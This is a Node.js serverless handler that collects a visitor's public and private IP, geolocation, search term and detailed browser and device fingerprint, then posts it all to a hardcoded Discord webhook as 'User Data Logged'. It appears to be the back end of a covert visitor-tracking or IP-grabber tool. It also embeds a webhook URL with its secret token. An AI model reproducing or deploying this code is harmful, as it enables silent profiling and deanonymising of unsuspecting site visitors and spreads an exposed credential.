import fetch from 'node-fetch';

export default async (req, res) => {
    if (req.method === 'POST') {
        const discordWebhookUrl = 'https://discord.com/api/webhooks/1303905695208570890/hqxllBpBroaolym0eh6KgVZE0vBlDu4Ng-yh9F1Tc4fhtlXm9J_odrDJWI6WMF3-2qr4';

        try {
            const {
                ip,
                searchTerm,
                userAgent,
                browserLanguage,
                osInfo,
                browserVersion,
                connectionType,
                timeZone,
                deviceMemory,
                hardwareConcurrency,
                pixelRatio,
                onlineStatus,
                viewportWidth,
                viewportHeight,
                screenWidth,
                screenHeight,
                colorDepth,
                touchSupport,
                cookiesEnabled,
                plugins,
                referrer,
                currentURL,
                timestamp
            } = req.body;

            // Get public IP from headers (proxy/IP forwarding)
            const publicIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

            // Fetch location data based on the public IP address
            let locationData = {};
            try {
                const locationResponse = await fetch(`https://ipapi.co/${publicIP}/json/`);
                locationData = await locationResponse.json();
            } catch (error) {
                console.error("Failed to fetch location data:", error);
                locationData = { city: "Unknown", region: "Unknown", country: "Unknown" };
            }

            // Prepare log message for Discord
            const logMessage = {
                embeds: [
                    {
                        title: 'User Data Logged',
                        description: `
                            **Public IP:** \`${publicIP || 'N/A'}\`
                            **Private IP:** \`${ip || 'N/A'}\`
                            **Approx. Location:** \`${locationData.city || 'N/A'}, ${locationData.region || 'N/A'}, ${locationData.country || 'N/A'}\`
                            **Search Term:** \`${searchTerm || 'No search term entered'}\`
                            **User Agent:** \`${userAgent || 'N/A'}\`
                            **Browser Language:** \`${browserLanguage || 'N/A'}\`
                            **Operating System:** \`${osInfo || 'N/A'}\`
                            **Browser Version:** \`${browserVersion || 'N/A'}\`
                            **Connection Type:** \`${connectionType || 'N/A'}\`
                            **Time Zone:** \`${timeZone || 'N/A'}\`
                            **Device Memory:** \`${deviceMemory || 'N/A'} GB\`
                            **Hardware Concurrency:** \`${hardwareConcurrency || 'N/A'}\`
                            **Pixel Ratio:** \`${pixelRatio || 'N/A'}\`
                            **Online Status:** \`${onlineStatus || 'N/A'}\`
                            **Viewport Size:** \`${viewportWidth || 'N/A'} x ${viewportHeight || 'N/A'}\`
                            **Screen Resolution:** \`${screenWidth || 'N/A'} x ${screenHeight || 'N/A'}\`
                            **Color Depth:** \`${colorDepth || 'N/A'}\`
                            **Touch Support:** \`${touchSupport || 'N/A'}\`
                            **Cookies Enabled:** \`${cookiesEnabled || 'N/A'}\`
                            **Browser Plugins:** \`${plugins || 'N/A'}\`
                            **Referrer URL:** \`${referrer || 'No referrer'}\`
                            **Current URL:** \`${currentURL || 'N/A'}\`
                            **Timestamp:** \`${timestamp || new Date().toISOString()}\`
                        `,
                        color: 0x00FF00,
                        timestamp: new Date(),
                    },
                ],
            };

            // Send data to Discord webhook
            const response = await fetch(discordWebhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(logMessage),
            });

            if (!response.ok) {
                const errorText = await response.text();
                console.error('Failed to send message to Discord:', response.status, errorText);
                return res.status(500).json({ message: 'Error sending to Discord' });
            }

            res.status(200).json({ message: 'User data logged successfully' });
        } catch (error) {
            console.error('Error occurred:', error);
            res.status(500).json({ message: 'Error processing request' });
        }
    } else {
        res.status(405).json({ message: 'Method Not Allowed' });
    }
};
